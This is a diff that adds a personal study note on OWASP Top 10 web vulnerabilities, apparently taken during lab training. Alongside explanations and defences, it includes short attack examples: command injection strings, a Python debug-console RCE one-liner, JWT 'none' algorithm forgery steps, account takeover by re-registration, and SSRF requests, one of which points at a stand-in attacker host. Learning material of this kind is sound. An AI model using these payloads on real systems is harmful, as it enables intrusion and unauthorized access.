@@ -1,0 +1,105 @@
+Tags: #Web #Commands #Exploitation #Tools 
+
+Refer to: [[JavaScript Essentials]] and [[SQL Fundamentals]] and [[Web Application Basics]] and [[HTTP In Depth]]
+
+To-Do: Portswigger Web Academy
+
+- Open Web Application Security Project (OWASP): Non profit foundation focused on understanding web technologies and exploits. Provides tools and resources to help improve security. New OWASP Top 10 comes every 4 years.
+- Reference: [OWASP Top 10 For 2021](https://owasp.org/Top10/)
+
+- Broken Access Control:
+	- Being able to bypass authorization and being able to preform tasks or view sensitive information from other users.
+- Insecure Direct Object Reference (IDOR):
+	- Access control vulnerability where you can access resources you wouldn't normally be able to see. Happens when a programmer exposes a Direct Object Reference, which is just an identifier that refers to specific objects in the server such as a file, user, bank, anything.
+		- Example: `https://bank.thm/account?id=111111` and you could change the `id` parameter to `id=22222` and since the server isn't checking to make sure you own the account, this is an IDOR.
+- Cryptographic Failures:
+	- Any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information.
+	- Such things as encrypting data in transit (encrypted traffic between server and client) and encrypting data at rest (emails stored on servers can remain encrypted)
+	- Some cryptographic failures involve using techniques such as "Man in The Middle" and could take advantage of weak or nonexistent encryption.
+	- Flat-File Databases: Database that is stored as a single file, not a database set up on a dedicated server running a database service.
+		- If a flat-file is stored underneath the root directory of the website, such as `/var/www` then you may be able to download and query it on your own machine.
+		- Use sqlite3 to access database information. Reference: [[SQL Fundamentals]]
+- Injection Overview:
+	- SQL Injection: Occurs when user-controlled input is passed to SQL queries. Can be used to pass SQL queries to manipulate the output such as being able to modify and delete information and also dump/steal sensitive information.
+	- Command Injection: User input is passed to system commands which can allow for execution of arbitrary commands on servers allowing a remote user to access the system.
+		- Prevention could be in the form of `allow lists` to compare safe inputs/characters to what a user sends or `stripping input` and removes dangerous characters before processing. Various libraries exist to do this for you.
+- Command Injection:
+	- Occurs when server-side code in a web application makes a call to a function that interacts with the server's console directly.
+		- Reference Image: [[Pasted image 20250408084552.png|Vulnerable Cowsay Command]] and [[Pasted image 20250408084843.png|How it works]]
+	- Exploitation:
+		- BASH allows usage of "inline commands" which are commands inside of commands. The inline command gets executed first and then passed as a paramter for the outer command.
+			- Reference Image: [[Pasted image 20250408085043.png|Inline Commands]] 
+		- Therefore we can exploit the cowsay above doing this:
+			- Reference Image: [[Pasted image 20250408085124.png|Cowsay Exploitation]]
+			- Could also exploit by doing: `; ls` or `; whoami`
+- Insecure Design:
+	- Refers to vulnerabilities which are inherent to the application's architecture. Not misconfigurations, but idea behind the whole application, or part of it is flawed from the start. Other times, a developer may add a shortcut during testing and forget to readd it, such as disabling OTP validation to make testing easier.
+		- Example of an Insecure Design: Instagram allowed for OTP password reset using a 6 digit SMS code, but allowed you to try the same pin 250 times per IP, so if you had 4k IP's you could brute-force the code and password reset anyone. This is an insecure design as they assumed nobody would have 4k IP's.
+	- To prevent: Preform threat modelling at the early stages of a development lifecycle.
+- Security Misconfiguration:
+	- Occur when security could have been appropriately configured, but it was night
+	- Includes:
+		- Poorly configured permissions on cloud services, like S3 buckets.
+		- Having unnecessary features enabled
+		- Default accounts with unchanged passwords
+		- Error messages that are overly detailed
+		- Not using HTTP Security Headers
+		- Exposure of debugging features in production software
+		- Example:
+			- Access a python debug console at `/console`
+			- Run python command for RCE: `import os; print(os.popen("ls -l").read())`
+- Vulnerable and Outdated Components:
+	- A company or entity is using a program with a well-known vulnerability.
+	- Example: Company hasn't updated their version of WordPress for a few years and your using WPScan and find the version is WordPress 4.6. Well WP 4.6 is vulnerable to RCE and you can find a premade exploit on exploit-db.
+		- Not every exploit you download will work. Most scripts on Exploit-DB require you to make modifications.
+- Identification and Authentication Failures:
+	- Common flaws in authentication include: `Brute Force Attacks`, `Use of Weak Credentials`, and `Weak Session Cookies (Predictable values)`.
+	- Example:
+		- `Re-Registration` of an already existing user may be a flaw. To do this: Simply register a new user but instead of "admin" register an " admin" user (notice the space). This will take over the previous admin and basically migrate the account to you.
+- Software and Data Integrity Failures:
+	- Arises from code or infrastructure that uses software or data without any kind of integrity checks. Attacker could modify the software or data passed to an application since there are no integrity checks.
+	- Software Integrity Failures:
+		- Reference Image: [[Pasted image 20250408101223.png|Using 3rd Party Libraries]]
+		- If an attacker got access to the jQuery Repo, they could change the contents of the js file and inject and execute malicious code in every browser that pulls from there since a simple `<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>` makes no integrity checks.
+		- Correct Way: Use Subresource Integrity (SRI) which allows you to specify a hash along the library's URL so code is only executed if the hash of the file matches. 
+			- Example: `<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>`
+			- Go to [SRIHash](https://www.srihash.org/) to generate hashes for any library if needed.
+	- Data Integrity Failures:
+		- Example: A web server uses cookies to remember which session is which. An example of data integrity would be to set a cookie to a username of the person because anyone could change their cookie to be someone else.
+		- JSON Web Tokens (JWT): Token implementation that deals with all the cryptography side of tokens and provides proof of integrity.
+			- Reference Image: [[Pasted image 20250408102937.png|JSON Web Token Breakdown]]
+			- If the payload is changed then the signature won't match. This signature involves the use of a secret key held only by the server. Also, JWT simply uses base64 encoding of the plaintext.
+			- Example of a vulnerability:
+				- Reference Image: [[Pasted image 20250408103105.png|JWT and the None Algorithm]]
+				- To do this: `Copy the JWT Value from Browser Cookies -> CyberChef and remove the signature after the 2nd . -> Base64 Decode -> Copy and change the algorithm to none -> Base64 Encode and change the cookie in the browser`
+				- NOTE: Remember you still need to have both period separating the values, so just Base64 encode each part one at a time.
+- Security Logging and Monitoring Files:
+	- Every action preformed on a web app by the user should be logged. Without logging, there would be no way to tell what actions were preformed by and attackers.
+	- Should have multiple copies of logs stored at different locations.
+	- Information Stored In Logs Should Include:
+		- HTTP status codes
+		- Time stamps
+		- Usernames
+		- API endpoints/page locations
+		- IP addresses
+	- Should have monitoring in place to detect suspicious activity too. Helps stop the attackers or reduce the impact if they're presence is detected later.
+	- Examples of Suspicious Activity:
+		- Multiple unauthorized attempts for a particular action.
+		- Requests from anomalous IP addresses or locations. Can be false positive.
+		- Use of automated tools.
+		- Common Payloads.
+- Server Side Request Forgery (SSRF):
+	- Occurs when an attacks can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. Often found in implementations where web applications need to use 3rd party services.
+	- SSRF cam ne used for:
+		- Enumerate internal networks including IP addresses and ports
+		- Abuse trust relationships between servers and gain access to restricted services.
+		- Interact with non-HTTP services to get RCE.
+	- Reference Image: [[Pasted image 20250408105937.png|3rd Party APIs]]
+		- The server parameter is exposed to users, so they could change the server to point to a machine they control.
+	- Example: 
+		- Attacker sends: `https://www.mysite.com/sms?server=attacker.thm&msg=ABC`
+		- Vulnerable Web App then Requests: `https://attacker.thm/api/send?msg=ABC`
+		- Attacker then: Captures contents of request using netcat.
+	- Using SSRF to access admin pages:
+		- Command: `http://10.10.190.86:8087/download?server=http://localhost:8087/admin%23&id=75482342'
+		- What this does: Essentially, the 10.10.190.86 reaches out to localhost now (itself) on the admin page and then you comment out the id since it doesn't matter.
